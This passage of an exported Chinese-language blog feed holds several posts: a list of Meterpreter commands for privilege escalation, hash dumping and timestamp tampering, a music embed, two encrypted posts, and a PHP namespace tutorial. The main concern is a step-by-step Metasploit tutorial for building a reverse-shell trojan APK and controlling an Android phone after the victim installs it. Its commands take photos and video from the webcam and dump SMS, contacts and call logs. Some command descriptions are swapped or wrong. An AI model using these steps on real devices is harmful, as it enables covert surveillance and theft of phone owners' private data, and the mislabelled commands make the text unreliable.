<h4 id="六、特权升级命令"><a href="#六、特权升级命令" class="headerlink" title="六、特权升级命令"></a>六、特权升级命令<font face="Arail"></h4><blockquote>
<blockquote>
<p>getsystem -获得系统管理员权限<br></font></p>
</blockquote>
</blockquote>
<h4 id="七、密码转储命令"><a href="#七、密码转储命令" class="headerlink" title="七、密码转储命令"></a>七、密码转储命令<font face="Arail"></h4><blockquote>
<blockquote>
<p>hashdump -抓去哈希密码 (SAM) 文件中的值<br></font></p>
</blockquote>
</blockquote>
<h4 id="八、Timestomp-命令"><a href="#八、Timestomp-命令" class="headerlink" title="八、Timestomp 命令"></a>八、Timestomp 命令<font face="Arail"></h4><blockquote>
<blockquote>
<p>timestomp -操作修改，访问，并创建一个文件的属性<br></font></p>
</blockquote>
</blockquote>
<p>&nbsp;<br>&nbsp;<br>&nbsp;</p>
]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>远程木马攻击</tag>
        <tag>Meterpreter命令</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploit之渗透安卓实战</title>
    <url>/post/Metasploit3/</url>
    <content><![CDATA[<p>&nbsp;<br>&nbsp;</p>
<h4 id="Metasploit之渗透安卓实战"><a href="#Metasploit之渗透安卓实战" class="headerlink" title="Metasploit之渗透安卓实战"></a><font face="楷体">Metasploit之渗透安卓实战</font></h4><table><tr><td bgcolor=#D1EEEE>&emsp;在之前的Metaspoloit使用中都是在Windows系统中，因为渗透的是Windows系统，所以选用了“windows/meterpreter/reverse_tcp”模块。
而这里需要渗透安卓系统了，就选用“android/meterpreter/reverse_tcp”模块。
那么对于kali-linux连接木马的方式还是和之前的一样，利用“exploit/multi/handler”
并且，同样需要选用“windows/meterpreter/reverse_tcp”的PAYLOAD
这里假设我的测试环境
kali-linux：  192.168.2.146
安卓模拟环境：192.168.2.107</td></tr></table>

<p>&nbsp;</p>
<h5 id="一、生成远程安卓木马"><a href="#一、生成远程安卓木马" class="headerlink" title="一、生成远程安卓木马"></a><font face="楷体">一、生成远程安卓木马</font></h5><table><tr><td bgcolor=#D1EEEE><font color="#dd0000">msfconsole
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.2.146 LPORT=4444 R > payload.apk</font></td></tr></table>

<blockquote>
<blockquote>
<p>命令解析：<br>p 设置要使用的payload<br>LHOST 设置用来接收反弹连接的主机（kali-linux的IP）<br>LPORT 设置用来接收反弹连接的端口（kali-linux的端口）<br>R 设置文件格式<br>Location 要保存的文件位置–&gt;/root/Desktop/是桌面，没有目录表示当前系统Home目录下<br>PS：对于目前的安卓系统安全机制的考虑，因为没有签名证书可能导致无法安装或易被受害者识破<br>那么，签名证书的制作可以查看参考文献资料</p>
</blockquote>
</blockquote>
<p>&nbsp;</p>
<h5 id="二、开启metasploit，并且开启相关连接"><a href="#二、开启metasploit，并且开启相关连接" class="headerlink" title="二、开启metasploit，并且开启相关连接"></a><font face="楷体">二、开启metasploit，并且开启相关连接</font></h5><table><tr><td bgcolor=#D1EEEE><font color="#dd0000">msfconsole
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST 192.168.2.146
set LPORT 4444
exploit</font></td></tr></table>

<p>&nbsp;</p>
<h5 id="三、meterpreter连接"><a href="#三、meterpreter连接" class="headerlink" title="三、meterpreter连接"></a><font face="楷体">三、meterpreter连接</font></h5><p><font face="楷体">&emsp;安卓手机安装并且打开木马后会返回我们一个meterpreter连接,那么我们可以使用以下的一些常用的命令:</font></p>
<table><tr><td bgcolor=#D1EEEE><font color="#dd0000">cd               -->目录切换，命令：cd /  切换到根目录
search           -->搜索文件，命令：search text.jpg
download         -->下载文件，命令：download test.jpg
webcam_list      -->查看摄像头列表，因为手机都是前置和后置摄像头了
webcam_snap      -->拍照一张，需要选用前置或者后置摄像头，命令：webcam_snap -i 1
webcam_stream    -->开启摄像头视频监控，同上，命令：webcam_stream -i 1</font>
<font color="#dd0000">安卓系统相关命令：
check_root       -->查看当前安卓是否已经root
dump_calllog     -->下载通话记录
dump_contacts    -->下载短信记录
dump_sms         -->下载通讯录
geolocate        -->利用谷歌地图定位（需要安装谷歌地图）</font></td></tr></table>

<p>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;</p>
]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>远程木马攻击</tag>
        <tag>安卓渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Music-Collection</title>
    <url>/post/Music-Collection/</url>
    <content><![CDATA[<p>&nbsp;</p>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=730 height=550 src="//music.163.com/outchain/player?type=0&id=692893521&auto=0&height=500"></iframe>

<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=730 height=450 src="//music.163.com/outchain/player?type=0&id=2197936899&auto=0&height=430"></iframe>

<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=730 height=450 src="//music.163.com/outchain/player?type=0&id=2527477789&auto=0&height=430"></iframe>

]]></content>
      <categories>
        <category>音乐</category>
      </categories>
  </entry>
  <entry>
    <title>Network attack and defense</title>
    <url>/post/Network-attack-and-defense/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Welcome to my blog, enter password to read.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="bfa29a02506a3ffe5b885739d8ad316e58c3c5e5ebf0875be5bd93f0055a9b6f">89afc1fdb5fcab1d358d28af7f5c707b3e9c7e74da01c27f843dfaed51ca9d12105ca06edbf229c8aa0f0c8813c82f703a687671713b6f51c7e6d58ad642bf84370c44fe224bf0f629fe79076a9b6bc9a3a93cb09c6e46dbd24c45b0bd5caa85785fcc347c7ebdb53879c416349749cf747fb6b7be521dedf24fddb4b175940561644415db448b1cf758718e7ff4b85193b83f8cb22da7cf955566e5cfda717f9232550bbbe2f66b03335a211fb11eccba3a5e89733a04d91d0077431a00a807</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Network-Security</category>
      </categories>
      <tags>
        <tag>Security</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全复习笔记</title>
    <url>/post/Network-security/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Welcome to my blog, enter password to read.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="3f638968b05f2021472fbf9797c3674ee5c9ad374851a3a39762c9c5e7344eb4">f794bb74916b45281706d6f1a8ea74174f03505928825a5f7cd41cec5377313517004f8d987d35c81db43a8e846bb497970a235100bf913c057decfa3c3a6d2d70e07ba05bbe6fd3d37b6b3a505953a1193cbedfe8286de7479058f6171d6d9aab846a118d92e08687f80f30d86acfaacede327e177e3e4ed9a71add132fcac2da892534e6005baebe5cf538c32e106f96cb52adc206469e4afde3cf3de6879fceae2795eafb774618d4003cfccdc24e26d42d4eb1b98b9ccec1616cd9d3f4f2fba02dc68f859c176002f0d41a9575167b63768127dd71775a9e2579c0afe7990b6bde2f41abf46bc1d9f4a25dff5c6b69d5b6b9d725ed41caf754819ecee10dfd636f54cb45d95fa1c68c9d66461058935c83619572cf615617536f5211cb1a502bb3b59cd9379ea885a394a1ae6ca8c69da2ee4ac04987fe64b363eb1b8a74eec389f198ea12a6c4c65df9e6b0829dd3bcebf906a008623cfe5af0049e3904775352dc4574ebda1621cc7716b7290bba20bf0e06559ed1ee8281a938d36b646e11a53104495cbe3ca82c72d01d89131a114a65e00166cf3a64fb891d5084196a27523af8c9957fc680c99975fb39e4f0fbeaa5a13b87f3ffb141ec117b64beb06f487b431fc5857468c89e27b08e8d3955e3e5614f63fb982b0239cf9986385d58b4859ca28294213d83d1b93ea89dae13c320a6f21192f66852225f55c59e3de9196247c9e1aa1c87c260fee95ccbbd1b6b2cc366e730ca4479f6e3bed82aa8c1055922c82a9cee15e5e8a5f815cfcfd96491ae59f6348adc3fc59ed0508e6eb7a26ca8d2dc19eb609071630a4307cfe16a9e20656b607cb7a85612f90fcec219066315de8ebae7e02940268158700378c28f6ced3da6110728f93d7eb7b6c9ac2c1bd2434d2090f10c6556625add7574fd814603aa5439be6ddea0fb1a1ca0e2260d8f61c7d00924ad820b41b5cf2cf797481bd83e0c8dc87d215edc6382bcc6be1d14df7bcb964bf500166cb9e7f5d413d546ba2fb69bfb2afbabd8649ad8b68360b129107d9588fed02b0fd591e4b98ddd4ec59a0c4a421bac1a8bfed813a80c0d815cf7c51049db432ebd731956f1fed2ab9d4fd8136838bc2d35fa0e8d52047180493a52f92fd1cf30598e2df71a60da273d263000dc850d58f35598607477da90d29b47b6223019bd2827b114715c46cfc48c2840367cac4e6776cf4c0b67f2621ca6eafdfd9ab401d6728ca34eb5109f02bc558e337c73fd4099c58ed1396ac20633595cee6c276410faf17aea7b9b1ffcb27a516f8fdf59e35f86a98f4246935c5ae163db6e230a40cae149011505285c119f320a36df1844ba95250629eb0f6fdfa649f1fb0bc1ee2978ede9daa73345ebc34a972b5d4f1ab63d4d6a824b928dd2eaf2cd8299b909a143cd78bb529a4063785df6baa9146af0316ac79151ab9d979e06cba83e1e9b00f7764051ac375338ec598c9998a3d96023e9dc50330122c2d3fc77398662e07add6ce2b3b2997c945abceba98490dfed2b8ddcc593e3b82e4d362013c5af4617bf2ba72f3d8f1c187be029339ebe46f78e68cf897d6157224fe455a566029d590355eb7f4fac01a7c49317de20bf244f913067e7579a725625fb84958b7b4e2f75f4487ce005ed4ae642c929455fef5e29df8136f7e26feaadba0b637acc520003bd43f32c929706667e4d6c56098c486145aadd233b0bc7aa6b2ae1a5d62b97e7bef55bc6e8e815e681bc766b8de356f76de1e99780c6bd7c1e1e3461279e1678622b39d85d9f1c61e1a4a46b19c546fb7890c0ef9302f2743a39ec3da471c06bdc5b46480d9ecb39b91a0c42f82ae8067f199916c6638e50e7872e71f60f2092d8ac46f7b74744a85c332120b90416c4de5451cdc6f373922e1b10da9e1ca88feb731896821c21413d32a49a961e631f0ed675ed1be0468103c910a583ec4ac201bceb1aecc3fccaee9c66e26db42d9a38777d01cbde58eb247b98b620b69918d3e91a5417e7d16ee3dc3238a72499620a094facd34202e2c72300d852f3f8dcb27526756417c00bfcd6d0d5ee796da01e3de7417187f769949ad8f1112976ffa75d4506723564fd3d22c339f072b3824044a4c64e1770ddb8401ad5da37d521d12c2265b496cac4c00d00f3c9308441415fd2d1351d837d9e9ed83e11768ccf13876e4399d0e4ebc4445436ae028e1f8028eac036a8be0198f417b3d4edaeba08ed108a4f0cce0199ece47f3e2b8e2bb284892342ea1a5a89bb83afbd20a0b1d5b043b5dd80fe23aa84462423eb3532cffd7adbc7b8f4b110eb08bd30089ec4e34949caa9f0cb9193eee8fb5ce9aa79a6eb45ca8891c77aa02d408dc766180093312aa6ff6985167e21bac087ed53da1fcf87261175b141cb383d186a5155975d3079126a261b7c3a2456bd77d16728c1da2d7e92a70a1b8d05742595d754512cc6f974c54865ec37a54c4ecc87d803c38713c83533d33938f96a285e5360f58c79cfe0f435a073b49dc59cb64ba8660d0b438d924e215f12db381f913179f8a5b92cb3bf4c7c5ec8852ca4139173d8e647e83ab3f0d2b87e05b4b7745e621ae9ac85930845e9888b8c604d27b78ecc4b06e8438735849e1709549ee0337dbbde4b8eae06e267a61fa77f65c3b66d38937344df5bb510d0e56a2d9ac8d9e08383bbf6311d5cc4c7d1a32f50887ebf0c4bb83ff477bf88d7adc544fb2bca4aed8ca5e8f1f894db265a67d6fd4591802ac8c4cf0aa4d6025e5633c4ad81dddfbb96009ee39c5158a2f49801fbbe0249d418e188594894653058d892641be107b85c1a5293e40038835dc4803304e4cbd991bc2e6d1fba1a145c28fc3c1565dba5816c1d819d831c09068d87a41994fec8face46b217476ea479b3a96e2b4dd1fc6ad0d627a7d4c7846dd6ccc719005076f586d9395225f9bcc2b77cacffe23d53493f3e7d1b2cf3107de634bdea0d9e49bd7742c20396df45e163d47d37adf9e08553e1357ca7871765d06dd592d29c034ea67fc06c96b05b30f4ded366542ea7a208ae1f692289e02b2ee0ea4f46edc5f45666cdc80f90728fc200518fd6f94265fc703de516f7fb9cf72effef6e5e94cdba9572e1f1c62864c726a5174687d032a9a78487e63fb6aaa71c82836736255effdc8f9bc48a118dd53eaf48e8dfa572fd7fefa7299299080a07684c9c539a20c6ad4733bd7c3845708b7f1afd98dfb6af3672bea069fac6b0c1dcc7669028a88f6875079f5c9e36ea0149fe78ae673ea9ff8f61fb464c95265219093dc99345bdd554a9a2915030a2f3f6c066e214fff9660df10016c14910734a8070a0d7d2629b45416a45eb670985a367d80c666a94c47bc29959c0504f76def9236fbd38d15fe7de33e9d59d34d863266a871a8a726a63d98e612aef217ec239a4a76222f1467c7e6de1f5ed46031311069dad024dbe4e4b2b42cefb3036fcc368c0f3540ba9d411a96a248a96562403387c49b0b6e1d0fcb06030720b03bd172a2db35736e5a1fe965630268996117eb77235c624088fe077469c0e0702ff5f87bfaa84c6d9df8a75fd7ca30241debfbc7902c9e07cbc805d902cda1893b8f932384113c3929178c7e91df54e665bc96e46cedfb447a3b46967d95cc2f93572159b966c07c3d97ef787c811524f768b6cdce528b188e27d54729075daed4fc4e5b1871762de04f5f3472e935c0d289a59b6a3d8cc1bfade8403abd0c96e56b8bcdbafd7a7e684e5274ae504b65cf501103ad729c0def88f2b896ba7c444ffa4e86fc9063eeb93eea08398cda1f9a4d99eba2e86437339742160873ee0dedce790d37eb6bd297f601ab5714df1672c576903c35154b96e6c9d1609de056d5372a331e44f54362bd58ff58a34854cd98943695f3838ae4d7ddffcea397fbd7850617517c2e69f3f7e60182ccb441e3cd4d50cbaeb26e85c000aea98ef4c3faf223efb8fb955e813ef6a263be087a141f2c65a8a847e8854ed99336c5899762ce8ce520f4b917872a1f980ca0409a569c886a3c8d1393c4667617d1a76d390e815dde123f8f472922936f58b831c7605585d48836a23b583ce2f2b566951e802842dfa589512922fa808c75a269b1992e1cfda5562dd748441739644c9a102b4d8ef1ed5a2024e2f7dd2e598b68863880a8c887942106ac3d1345bb751e2921452f24fa83a2dbca0b5b8d7f3ddc522c5b364403a2177d2bd255e2279b46bfccb2b6d58e2a11aff18fb9415d505eb1c32517e77349d5ad84a1abba82b9611ecbf6f13065443753fa20dc5501035417d431a1414f1e14c34fd0f3aa155fe63ce4f680eea1fe5fc4f650efc7f17d341069672330fd31db2c9ba6750b8a5aef2044798f8834ea08c0d2ecd856d9976ee29373bbef8fa092635681c118d75893532b6457de4d1676fad78292c10d7def75d7d66e3c574b93f2f65ea09b150a5c6deeb47c3617d9fe264b26572e16e7636a95a8d249afa50a700ae173d3b88ef40b2073f968df34c52220e21ca16d0ab2d695105ef4ccda0f6aee2d200d37746aaa96db2146f687eea6aa46c3eebd08e0d766a89a74f23b90610a6699008b425b9d987f3445b0d7777f28d23fc31da16938513b1bb1f5b1d8595dae1a51036e3123b438f191c26f20cb0954235c5fa4de0fc01100911de6cde6f4131937f26943b0aa2f156f69c464dff171cc7501cbf8bf03f81ced58b2346e1cd730be11a11246ed282d86af506982ea52696d53888ad27ff5ad2849524104b962130c6c8400fd95bdc1dc435310b45a8e590d873f71847670390ab18ec1b570d8a45f1355e272800e6ec8241470120583ab5bda4b0f20f6ee4a48bfe8058d8256671358277060df75a41252a62858a3d74967a99709ab464e9a14f04fbc0f1fb8f87816c6292e41d369697e4321e7e7ba14f21f21d3ac906d6df8b32503c3d08439c076a612043231a74e2a7aacc9158b1bde64279479e73396b7b6e3d3224d720187396471b83b384a29e5ded9556c94120dabd3e9faf4c3bfb94cba80de9e9c7645ae617e51d27a323d848d04c760068b284d2dececcc0e55f2eecb113e656a05daaae73d23702da2f70d74147b3830b49cb65cb0389627fbdf85770697641b0f01d900a003ef32e5290c01997c8bbb4daa7ce95399bfaa7a8e9087b800d42ea1d12171fc8dc3598cdc9dd1d6d24d394215a771163b34cb08ca2df15da761e2aee57bc7efa614e5e447981fff4ce5f2277f4ebbf07e3ad5e77cab1</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>安全笔记</tag>
        <tag>安全指导</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-命名空间</title>
    <url>/post/PHP-namespace/</url>
    <content><![CDATA[<p>(oﾟvﾟ)ノ</p>
<a id="more"></a>

<blockquote>
<blockquote>
<p><font color="red">如果没有定义任何命名空间，所有的类与函数的定义都是在全局空间</font>，与 PHP 引入命名空间概念前一样。在名称前加上前缀 \ 表示该名称是全局空间中的名称，即使该名称位于其它的命名空间中时也是如此。对于函数和常量来说，如果当前命名空间中不存在该函数或常量，PHP 会退而使用全局空间中的函数或常量。</p>
</blockquote>
</blockquote>
<blockquote>
<blockquote>
<p><font color="#00B2EE"><strong>名称解析遵循下列规则：</strong></font></p>
</blockquote>
</blockquote>
<ol>
<li>对完全限定名称的函数，类和常量的调用在编译时解析。例如 new \A\B 解析为类 A\B。</li>
<li>所有的非限定名称和限定名称（非完全限定名称）根据当前的导入规则在编译时进行转换。例如，如果命名空间 A\B\C 被导入为 C，那么对 C\D\e() 的调用就会被转换为 A\B\C\D\e()。</li>
<li>在命名空间内部，所有的没有根据导入规则转换的限定名称均会在其前面加上当前的命名空间名称。例如，在命名空间 A\B 内部调用C\D\e()，则 C\D\e() 会被转换为 A\B\C\D\e() 。</li>
<li>非限定类名根据当前的导入规则在编译时转换（用全名代替短的导入名称）。例如，如果命名空间 A\B\C 导入为C，则 new C() 被转换为 new A\B\C() 。</li>
<li>在命名空间内部（例如A\B），对非限定名称的函数调用是在运行时解析的。例如对函数 foo() 的调用是这样解析的：<br>(1). 在当前命名空间中查找名为 A\B\foo() 的函数<br>(2). 尝试查找并调用 全局(global) 空间中的函数 foo()。</li>
<li>在命名空间（例如A\B）内部对非限定名称或限定名称类（非完全限定名称）的调用是在运行时解析的。下面是调用 new C() 及 new D\E() 的解析过程： new C()的解析:<br>(1). 在当前命名空间中查找A\B\C类。<br>(2). 尝试自动装载类A\B\C。<blockquote>
<blockquote>
<p><font color="red">new D\E()的解析:</font><br>(1). 在类名称前面加上当前命名空间名称变成：A\B\D\E，然后查找该类。<br>(2). 尝试自动装载类 A\B\D\E。<br>为了引用全局命名空间中的全局类，必须使用完全限定名称 new \C()。</p>
</blockquote>
</blockquote>
</li>
</ol>
<hr>
<hr>
<p>&emsp;<br>&emsp;</p>
<p><font face="Comic sans MS">对于命名空间，官方文档已经说得很详细<font color="red">[<a href="http://www.php.net/manual/zh/language.namespaces.rationale.php">查看</a>]</font>，我在这里做了一下实践和总结。<br><font color="red">命名空间一个最明确的目的就是解决<strong>重名问题</strong></font>，PHP中不允许两个函数或者类出现相同的名字，否则会产生一个致命的错误。这种情况下只要避免命名重复就可以解决，<font color="red">最常见的一种做法是约定一个前缀</font>。</p>
<p>例：项目中有两个模块：article和message board，它们各自有一个处理用户留言的类Comment。之后我可能想要增加对所有用户留言的一些信息统计功能，比如说我想得到所有留言的数量。这时候调用它们Comment提供的方法是很好的做法，但是同时引入各自的Comment类显然是不行的，代码会出错，在另一个地方重写任何一个Comment也会降低维护性。那这时只能重构类名，我约定了一个命名规则，在类名前面加上模块名，像这样：Article_Comment、MessageBoard_Comment</p>
<p>可以看到，名字变得很长，那意味着以后使用Comment的时候会写上更多的代码（至少字符多了）。并且，以后如果要对各个模块增加更多的一些整合功能，或者是互相调用，发生重名的时候就需要重构名字。当然在项目开始的时候就注意到这个问题，并规定命名规则就能很好的避免这个问题。<font color="red">另一个解决方法可以考虑使用命名空间。</font></p>
<p>&emsp;<br><font color="#00B2EE"><strong>注明：</strong></font><br>本文提到的常量：PHP5.3开始const关键字可以用在类的外部。const和define都是用来声明常量的（它们的区别不详述），<font color="red">但是在命名空间里，define的作用是全局的，而const则作用于当前空间。</font>我在文中提到的常量是指使用const声明的常量。</p>
<p><font color="#00B2EE"><strong>基础：</strong></font><br>命名空间将代码划分出不同的空间（区域），每个空间的常量、函数、类（为了偷懒，我下边都将它们称为元素）的名字互不影响， 这个有点类似我们常常提到的‘封装’的概念。<br>创建一个命名空间需要使用namespace关键字，这样：<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//创建一个名为<span class="string">&#x27;Article&#x27;</span>的命名空间</span><br><span class="line">namespace Article;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font color="red"><strong>要注意的是，当前脚本文件的第一个命名空间前面不能有任何代码，下面的写法都是错误的：</strong></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">//例一</span><br><span class="line">//在脚本前面写了一些逻辑代码</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$path</span> = <span class="string">&quot;/&quot;</span>;</span><br><span class="line">class Comment &#123; &#125;</span><br><span class="line">namespace Article;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">//例二</span><br><span class="line">//在脚本前面输出了一些字符</span><br><span class="line">&lt;html&gt;&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">namespace Article;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>为什么要说第一个命名空间呢？<font color="red">因为同一脚本文件中可以创建多个命名空间。</font><br>下面我创建了两个命名空间，顺便为这两个空间各自添加了一个Comment类元素：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//创建一个名为&#x27;Article&#x27;的命名空间</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Article</span>;</span><br><span class="line"><span class="comment">//此Comment属于Article空间的元素</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Comment</span> </span>&#123; &#125;</span><br><span class="line"><span class="comment">//创建一个名为&#x27;MessageBoard&#x27;的命名空间</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">MessageBoard</span>;</span><br><span class="line"><span class="comment">//此Comment属于MessageBoard空间的元素</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Comment</span> </span>&#123; &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;<br><strong>在不同空间之间不可以直接调用其它元素，需要使用命名空间的语法：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Article</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Comment</span> </span>&#123; &#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">MessageBoard</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Comment</span> </span>&#123; &#125;</span><br><span class="line"><span class="comment">//调用当前空间（MessageBoard）的Comment类</span></span><br><span class="line">$comment = <span class="keyword">new</span> Comment();</span><br><span class="line"><span class="comment">//调用Article空间的Comment类</span></span><br><span class="line">$article_comment = <span class="keyword">new</span> \Article\Comment();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<blockquote>
<p>可以看到，在MessageBoard空间中调用article空间里的Comment类时，使用了一种像文件路径的语法： \空间名\元素名<br>除了类之外，对函数和常量的用法是一样的，下面我为两个空间创建了新的元素，并在MessageBoard空间中输出了它们的值。</p>
</blockquote>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Article;</span><br><span class="line">const PATH = <span class="string">&#x27;/article&#x27;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">getCommentTotal</span></span>() &#123;</span><br><span class="line">    <span class="built_in">return</span> 100;</span><br><span class="line">&#125;</span><br><span class="line">class Comment &#123; &#125;</span><br><span class="line"></span><br><span class="line">namespace MessageBoard;</span><br><span class="line">const PATH = <span class="string">&#x27;/message_board&#x27;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">getCommentTotal</span></span>() &#123;</span><br><span class="line">    <span class="built_in">return</span> 300;</span><br><span class="line">&#125;</span><br><span class="line">class Comment &#123; &#125;</span><br><span class="line">//调用当前空间的常量、函数和类</span><br><span class="line"><span class="built_in">echo</span> PATH; ///message_board</span><br><span class="line"><span class="built_in">echo</span> getCommentTotal(); //300</span><br><span class="line"><span class="variable">$comment</span> = new Comment();</span><br><span class="line"></span><br><span class="line">//调用Article空间的常量、函数和类</span><br><span class="line"><span class="built_in">echo</span> \Article\PATH; ///article</span><br><span class="line"><span class="built_in">echo</span> \Article\getCommentTotal(); //100</span><br><span class="line"><span class="variable">$article_comment</span> = new \Article\Comment();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>然后我的确得到了Article空间的元素数据。<br>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>子空间</strong></font><br>命名空间的调用语法像文件路径一样是有道理的，它允许我们自定义子空间来描述各个空间之间的关系。<br>抱歉我忘了说，article和message board这两个模块其实都是处于同一个blog项目内。如果用命名空间来表达它们的关系，是这样：<br></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//我用这样的命名空间表示处于blog下的article模块</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Blog</span>\<span class="title">Article</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Comment</span> </span>&#123; &#125;</span><br><span class="line"><span class="comment">//我用这样的命名空间表示处于blog下的message board模块</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Blog</span>\<span class="title">MessageBoard</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Comment</span> </span>&#123; &#125;</span><br><span class="line"><span class="comment">//调用当前空间的类</span></span><br><span class="line">$comment = <span class="keyword">new</span> Comment();</span><br><span class="line"><span class="comment">//调用Blog\Article空间的类</span></span><br><span class="line">$article_comment = <span class="keyword">new</span> \Blog\Article\Comment();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>而且，子空间还可以定义很多层次，比如说 Blog\Article\Archives\Date</p>
<p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>公共空间</strong></font><br>我有一个common_inc.php脚本文件，里面有一些好用的函数和类：</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">getIP</span></span>() &#123; &#125;</span><br><span class="line">class FilterXSS &#123; &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS">在一个命名空间里引入这个脚本，脚本里的元素不会归属到这个命名空间。如果这个脚本里没有定义其它命名空间，它的元素就始终处于公共空间中：<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Blog\Article;</span><br><span class="line">//引入脚本文件</span><br><span class="line">include <span class="string">&#x27;./common_inc.php&#x27;</span>;</span><br><span class="line"><span class="variable">$filter_XSS</span> = new FilterXSS(); //出现致命错误：找不到Blog\Article\FilterXSS类</span><br><span class="line"><span class="variable">$filter_XSS</span> = new \FilterXSS(); //正确</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS"><br>调用公共空间的方式是直接在元素名称前加 \ 就可以了，否则PHP解析器会认为我想调用当前空间下的元素。除了自定义的元素，还包括PHP自带的元素，都属于公共空间。<br>要提一下，其实公共空间的函数和常量不用加 \ 也可以正常调用（不明白PHP为什么要这样做），但是为了正确区分元素，还是建议调用函数的时候加上 \</p>
<p><strong>名称术语</strong><br>在说别名和导入之前，需要知道关于空间三种名称的术语，以及PHP是怎样解析它们的。官方文档说得非常好，我就直接拿来套了。</p>
<p>1.非限定名称，或不包含前缀的类名称，例如 $comment = new Comment();。如果当前命名空间是Blog\Article，Comment将被解析为Blog\Article\Comment。如果使用Comment的代码不包含在任何命名空间中的代码（全局空间中），则Comment会被解析为Comment。</p>
<p>2.限定名称，或包含前缀的名称，例如 $comment = new Article\Comment();。如果当前的命名空间是Blog，则Comment会被解析为Blog\Article\Comment。如果使用Comment的代码不包含在任何命名空间中的代码（全局空间中），则Comment会被解析为Comment。</p>
<p>3.完全限定名称，或包含了全局前缀操作符的名称，例如 $comment = new \Article\Comment();。在这种情况下，Comment总是被解析为代码中的文字名(literal name)Article\Comment。</p>
<p>其实可以把这三种名称类比为文件名（例如 comment.php）、相对路径名（例如 ./article/comment.php）、绝对路径名（例如 /blog/article/comment.php），这样可能会更容易理解。</p>
<p>我用了几个示例来表示它们：<br></font></p>
